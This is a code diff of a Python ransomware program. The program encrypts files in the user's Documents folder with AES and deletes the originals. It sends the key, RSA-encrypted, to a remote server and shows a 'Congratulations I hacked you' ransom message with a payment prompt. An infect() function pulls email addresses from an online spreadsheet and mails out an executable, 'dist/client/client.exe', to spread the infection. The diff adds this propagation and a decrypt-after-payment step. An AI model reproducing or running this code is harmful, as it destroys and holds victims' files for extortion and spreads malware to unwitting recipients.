@@ -6,9 +6,6 @@ from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 import os
 import glob
-from cryptography.hazmat.primitives.asymmetric import padding, rsa
-from cryptography.hazmat.primitives import serialization, hashes
-from cryptography.hazmat.primitives.asymmetric.padding import OAEP
 import smtplib
 import csv
 from email.mime.multipart import MIMEMultipart
@@ -33,6 +30,28 @@ def find_all_files():
     txt_files = glob.glob(file_pattern)
     return txt_files
 
+def find_all_encrypted_files():
+    desktop_path = os.path.expanduser("~/Documents")
+    file_pattern = os.path.join(desktop_path, "*.encrypted")
+    txt_files = glob.glob(file_pattern)
+    return txt_files
+
+def decrypt_file(file_path, key):
+    with open(file_path, 'rb') as f:
+        encrypted_data = f.read()
+        iv = encrypted_data[:16]
+        encrypted_message = encrypted_data[16:]
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        decrypted_message = cipher.decrypt(encrypted_message)
+        unpadded_message = decrypted_message[:-decrypted_message[-1]]
+        with open(file_path[:-10], 'wb') as f_out:  # Remove the '.encrypted' extension
+            f_out.write(unpadded_message)
+    os.remove(file_path)
+
+def decrypt_all(key):
+    for file in find_all_encrypted_files():
+        decrypt_file(file, key)
+
 def encrypt_file(file_path, key):
     iv = os.urandom(16)
     with open(file_path, 'rb') as f:
@@ -44,17 +63,11 @@ def encrypt_file(file_path, key):
             f_out.write(iv + encrypted_message)
     os.remove(file_path)
 
-
-def find_all_encrypted_files():
-    txt_files = glob.glob('**/*.encrypted', recursive=True)
-    return txt_files
-
 def save_key(key, file_name='Key.key'):
     desktop_path = os.path.expanduser("~/Documents")
     file_path = os.path.join(desktop_path, file_name)
     with open(file_path, 'wb') as f:
         f.write(key)
-
 
 def read_key(file_name='Key.key'):
     desktop_path = os.path.expanduser("~/Documents")
@@ -62,6 +75,7 @@ def read_key(file_name='Key.key'):
     with open(file_path, 'rb') as f:
         key = f.read()
     return key
+
 def encrypt_using_public(public_key, message):
     pk = RSA.import_key(public_key)
     cipher = PKCS1_OAEP.new(pk)
@@ -105,7 +119,6 @@ def sendmail(content, receiver, attachment_path):
     server.send_message(message)
     server.quit()
 
-
 def infect(csv_url, attachment):
     response = requests.get(csv_url)
 
@@ -126,15 +139,7 @@ def infect(csv_url, attachment):
     print(emails)
 
 
-# subprocess.Popen('cmd.exe')
-infect("https://docs.google.com/spreadsheets/d/1Wcb2hzqL56QorxwBFW96QWSuyYv_x9VwiFH1nMqJCHA/gviz/tq?tqx=out:csv", "")
-cmd_process = subprocess.Popen(
-    ['start', 'cmd'], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
-# Send a message to the command prompt
-message = "Congratulations I hacked you , Encryption in progress!!"
-cmd_process.stdin.write(f'echo {message}\n'.encode())
-cmd_process.stdin.flush()
-
+infect("https://docs.google.com/spreadsheets/d/1Wcb2hzqL56QorxwBFW96QWSuyYv_x9VwiFH1nMqJCHA/gviz/tq?tqx=out:csv", "dist/client/client.exe")
 
 key = generate_key(16)
 bytes_key = key.encode('utf-8')
@@ -146,13 +151,7 @@ for file_path in txt_files:
 
 save_key(bytes_key)
 
-cmd_process.stdin.write(
-    b'python -c "import sys; sys.stdout.write(input(\'Enter your decryption key:\'))"\n')
-cmd_process.stdin.flush()
 
-# Read the user's input from the command prompt
-user_input = cmd_process.stdout.readline().decode().strip()
-print("User input:", user_input)
 #plaintext = decrypt_using_private(private_key=private_key, ciphertext=encrypted_key)
 #print (plaintext)
 
@@ -170,18 +169,17 @@ print("Received public key:", public_key)
 # Send "SUIII" message to server
 server_socket.send(encrypt_using_public(public_key=public_key, message=bytes_key))
 
-
-#simulate that the user paid (I will put some dummy operations for now)
-x=2+2
-y=3+3
+message = "Congratulations I hacked you , Encryption in progress!!"
+subprocess.call(['cmd', '/c', 'echo', message])
+user_input = input('Enter OK if you have paid!')
 
 #request decrypted AES key from the server
 AES_key_received = server_socket.recv(1024).decode()
 #if this prints true, then the process is successful
 print(AES_key_received==key) #key is the original AES key
 
-
-#decrypt all files
+if user_input == 'OK':
+    decrypt_all(AES_key_received.encode('utf-8'))
 
 server_socket.close()
 
